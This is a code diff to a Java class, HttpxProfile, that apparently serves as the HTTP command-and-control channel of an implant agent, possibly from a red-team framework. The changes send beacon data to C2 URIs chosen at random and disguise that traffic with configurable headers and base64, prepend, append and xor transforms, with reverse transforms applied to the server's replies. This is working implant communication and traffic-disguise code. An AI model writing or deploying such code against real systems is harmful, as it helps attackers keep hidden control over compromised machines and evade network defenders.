@@ -7,7 +7,8 @@ import org.apache.hc.client5.http.classic.methods.HttpPost;
 import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
 import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
 import org.apache.hc.client5.http.impl.classic.HttpClients;
-import org.apache.hc.core5.http.io.entity.StringEntity;
+import org.apache.hc.core5.http.ContentType;
+import org.apache.hc.core5.http.io.entity.ByteArrayEntity;
 import org.apache.hc.core5.http.io.entity.EntityUtils;
 
 import java.nio.charset.StandardCharsets;
@@ -70,13 +71,31 @@ public class HttpxProfile implements C2Profile {
     private HttpxConfig parseHttpxConfig() {
         try {
             String rawC2Config = config.getRawC2Config();
+            Config.debugLog(config, "Parsing raw_c2_config: " + (rawC2Config != null ? rawC2Config.substring(0, Math.min(100, rawC2Config.length())) + "..." : "null"));
+            
             if (rawC2Config != null && !rawC2Config.isEmpty()) {
-                JsonNode configNode = objectMapper.readTree(rawC2Config);
-                return objectMapper.treeToValue(configNode, HttpxConfig.class);
+                // Configure ObjectMapper to allow unescaped control characters and backslash escapes
+                ObjectMapper lenientMapper = new ObjectMapper();
+                lenientMapper.configure(com.fasterxml.jackson.core.JsonParser.Feature.ALLOW_UNQUOTED_CONTROL_CHARS, true);
+                lenientMapper.configure(com.fasterxml.jackson.core.JsonParser.Feature.ALLOW_BACKSLASH_ESCAPING_ANY_CHARACTER, true);
+                lenientMapper.configure(com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
+                
+                JsonNode configNode = lenientMapper.readTree(rawC2Config);
+                HttpxConfig parsed = lenientMapper.treeToValue(configNode, HttpxConfig.class);
+                
+                Config.debugLog(config, "Parsed httpx config:");
+                Config.debugLog(config, "  post endpoint: " + (parsed.post != null ? "present" : "null"));
+                if (parsed.post != null) {
+                    Config.debugLog(config, "    uris: " + parsed.post.uris);
+                }
+                
+                return parsed;
             }
         } catch (Exception e) {
             Config.debugLog(config, "Failed to parse httpx config: " + e.getMessage());
+            e.printStackTrace();
         }
+        Config.debugLog(config, "Using empty httpx config as fallback");
         return new HttpxConfig(); // Return empty config as fallback
     }
     
@@ -107,18 +126,30 @@ public class HttpxProfile implements C2Profile {
         
         HttpPost post = new HttpPost(url);
         
-        // Apply headers
-        post.setHeader("User-Agent", config.getUserAgent());
-        post.setHeader("Content-Type", "application/json");
+        // Set all headers from config (includes User-Agent and any custom headers)
+        Map<String, String> headers = config.getHeaders();
+        if (headers != null) {
+            for (Map.Entry<String, String> header : headers.entrySet()) {
+                post.setHeader(header.getKey(), header.getValue());
+                Config.debugLog(config, "Setting header: " + header.getKey() + ": " + header.getValue());
+            }
+        }
         
+        // Override/add headers from httpx config if specified
         if (httpxConfig.post != null && httpxConfig.post.client != null && 
             httpxConfig.post.client.headers != null) {
             for (Map.Entry<String, String> header : httpxConfig.post.client.headers.entrySet()) {
                 post.setHeader(header.getKey(), header.getValue());
+                Config.debugLog(config, "Setting httpx header: " + header.getKey() + ": " + header.getValue());
             }
         }
         
-        post.setEntity(new StringEntity(new String(transformedData, StandardCharsets.UTF_8)));
+        // Always set Content-Type last
+        post.setHeader("Content-Type", "application/json");
+        
+        // Send raw bytes directly (matches oopsie's request.body(data) behavior)
+        post.setEntity(new ByteArrayEntity(transformedData, ContentType.APPLICATION_JSON));
+        Config.debugLog(config, "  Sending " + transformedData.length + " bytes as body");
         
         try (CloseableHttpResponse response = httpClient.execute(post)) {
             int statusCode = response.getCode();
@@ -127,6 +158,10 @@ public class HttpxProfile implements C2Profile {
             Config.debugLog(config, "HTTPX response status: " + statusCode);
             
             if (statusCode >= 200 && statusCode < 300) {
+                Config.debugLog(config, "  Response size: " + responseBytes.length + " bytes");
+                Config.debugLog(config, "  Response (first 100 chars): " + 
+                    new String(responseBytes, 0, Math.min(100, responseBytes.length), StandardCharsets.UTF_8));
+                
                 // Apply server transforms (reverse)
                 byte[] untransformedData = applyServerTransforms(responseBytes);
                 return new String(untransformedData, StandardCharsets.UTF_8);
@@ -180,21 +215,40 @@ public class HttpxProfile implements C2Profile {
             // Randomly select from available URIs
             return httpxConfig.post.uris.get(new Random().nextInt(httpxConfig.post.uris.size()));
         }
-        return config.getPostUri();
+        
+        Config.debugLog(config, "WARNING: No URIs in httpx config, using fallback");
+        Config.debugLog(config, "  httpxConfig.post: " + httpxConfig.post);
+        if (httpxConfig.post != null) {
+            Config.debugLog(config, "  httpxConfig.post.uris: " + httpxConfig.post.uris);
+        }
+        
+        String fallbackUri = config.getPostUri();
+        if (fallbackUri == null || fallbackUri.isEmpty()) {
+            // Last resort - use default URI
+            Config.debugLog(config, "  No fallback URI, using default /");
+            return "/";
+        }
+        return fallbackUri;
     }
     
     private byte[] applyClientTransforms(byte[] data) {
         if (httpxConfig.post == null || httpxConfig.post.client == null || 
             httpxConfig.post.client.transforms == null) {
+            Config.debugLog(config, "No client transforms to apply");
             return data;
         }
         
+        Config.debugLog(config, "Applying " + httpxConfig.post.client.transforms.size() + " client transforms");
         byte[] result = data;
         for (Transform transform : httpxConfig.post.client.transforms) {
             try {
+                Config.debugLog(config, "  Applying transform: " + transform.action + " (value: " + 
+                    (transform.value != null && transform.value.length() > 20 ? transform.value.substring(0, 20) + "..." : transform.value) + ")");
                 result = applyTransform(result, transform);
+                Config.debugLog(config, "  Result size: " + result.length + " bytes");
             } catch (Exception e) {
                 Config.debugLog(config, "Transform failed: " + transform.action + " - " + e.getMessage());
+                e.printStackTrace();
             }
         }
         return result;
@@ -209,11 +263,18 @@ public class HttpxProfile implements C2Profile {
         byte[] result = data;
         // Server transforms are applied in reverse
         List<Transform> transforms = httpxConfig.post.server.transforms;
+        Config.debugLog(config, "Applying " + transforms.size() + " server transforms (reverse order)");
+        
         for (int i = transforms.size() - 1; i >= 0; i--) {
             try {
+                Config.debugLog(config, "  Reversing transform " + (i+1) + ": " + transforms.get(i).action);
+                Config.debugLog(config, "    Input size: " + result.length + " bytes, first 50 chars: " + 
+                    new String(result, 0, Math.min(50, result.length), StandardCharsets.UTF_8));
                 result = applyTransformReverse(result, transforms.get(i));
+                Config.debugLog(config, "    Output size: " + result.length + " bytes");
             } catch (Exception e) {
                 Config.debugLog(config, "Reverse transform failed: " + transforms.get(i).action + " - " + e.getMessage());
+                throw new RuntimeException(e);
             }
         }
         return result;
@@ -222,9 +283,17 @@ public class HttpxProfile implements C2Profile {
     private byte[] applyTransform(byte[] data, Transform transform) throws Exception {
         switch (transform.action.toLowerCase()) {
             case "base64":
-                return Base64.getEncoder().encode(data);
+                // Encode to String then get UTF-8 bytes (matches oopsie behavior)
+                return Base64.getEncoder().encodeToString(data).getBytes(StandardCharsets.UTF_8);
             case "base64url":
-                return Base64.getUrlEncoder().withoutPadding().encode(data);
+                // Encode to String then get UTF-8 bytes (matches oopsie behavior)
+                // Use URL encoder WITH padding (Rust's BASE64_URL_SAFE includes padding)
+                String encoded = Base64.getUrlEncoder().encodeToString(data);
+                Config.debugLog(config, "  Base64url output (first 100 chars): " + 
+                    (encoded.length() > 100 ? encoded.substring(0, 100) + "..." : encoded));
+                Config.debugLog(config, "  Base64url output (last 100 chars): " + 
+                    (encoded.length() > 100 ? "..." + encoded.substring(encoded.length() - 100) : encoded));
+                return encoded.getBytes(StandardCharsets.UTF_8);
             case "prepend":
                 return concatenate(transform.value.getBytes(StandardCharsets.UTF_8), data);
             case "append":
@@ -242,13 +311,39 @@ public class HttpxProfile implements C2Profile {
             case "base64":
                 return Base64.getDecoder().decode(data);
             case "base64url":
+                String dataStr = new String(data, StandardCharsets.UTF_8);
+                Config.debugLog(config, "  Base64url input: " + 
+                    (dataStr.length() > 200 ? dataStr.substring(0, 100) + "..." + dataStr.substring(dataStr.length() - 100) : dataStr));
                 return Base64.getUrlDecoder().decode(data);
             case "prepend":
                 int prependLen = transform.value.getBytes(StandardCharsets.UTF_8).length;
-                return Arrays.copyOfRange(data, prependLen, data.length);
+                Config.debugLog(config, "  Stripping " + prependLen + " bytes from start");
+                
+                if (prependLen >= data.length) {
+                    Config.debugLog(config, "  Prepend already stripped (data too small), skipping");
+                    return data;
+                }
+                
+                int startPos = prependLen;
+                while (startPos < data.length && data[startPos] != '\r' && data[startPos] != '\n') {
+                    startPos++;
+                }
+                // Skip past the line separator(s)
+                while (startPos < data.length && (data[startPos] == '\r' || data[startPos] == '\n')) {
+                    startPos++;
+                }
+                
+                Config.debugLog(config, "  Advanced to position " + startPos + " (skipped " + (startPos - prependLen) + " trailing bytes)");
+                byte[] afterPrependStrip = Arrays.copyOfRange(data, startPos, data.length);
+                String prependPreview = new String(Arrays.copyOfRange(afterPrependStrip, 0, Math.min(100, afterPrependStrip.length)), StandardCharsets.UTF_8);
+                Config.debugLog(config, "  After prepend strip (size " + afterPrependStrip.length + "): " + prependPreview);
+                return afterPrependStrip;
             case "append":
                 int appendLen = transform.value.getBytes(StandardCharsets.UTF_8).length;
-                return Arrays.copyOfRange(data, 0, data.length - appendLen);
+                byte[] afterAppendStrip = Arrays.copyOfRange(data, 0, data.length - appendLen);
+                String appendPreview = new String(Arrays.copyOfRange(afterAppendStrip, 0, Math.min(100, afterAppendStrip.length)), StandardCharsets.UTF_8);
+                Config.debugLog(config, "  After append strip (size " + afterAppendStrip.length + "): " + appendPreview);
+                return afterAppendStrip;
             case "xor":
                 return xor(data, transform.value.getBytes(StandardCharsets.UTF_8));
             default:
@@ -289,11 +384,13 @@ public class HttpxProfile implements C2Profile {
     
     // Configuration classes for httpx
     static class HttpxConfig {
+        public String name;
         public Endpoint post;
         public Endpoint get;
     }
     
     static class Endpoint {
+        public String verb;
         public List<String> uris = new ArrayList<>();
         public EndpointClient client;
         public EndpointServer server;
@@ -301,11 +398,20 @@ public class HttpxProfile implements C2Profile {
     
     static class EndpointClient {
         public Map<String, String> headers;
+        public Map<String, String> parameters;
+        public C2Message message;
         public List<Transform> transforms;
     }
     
     static class EndpointServer {
+        public Map<String, String> headers;
         public List<Transform> transforms;
+        public C2Message message;
+    }
+    
+    static class C2Message {
+        public String location;
+        public String name;
     }
     
     static class Transform {
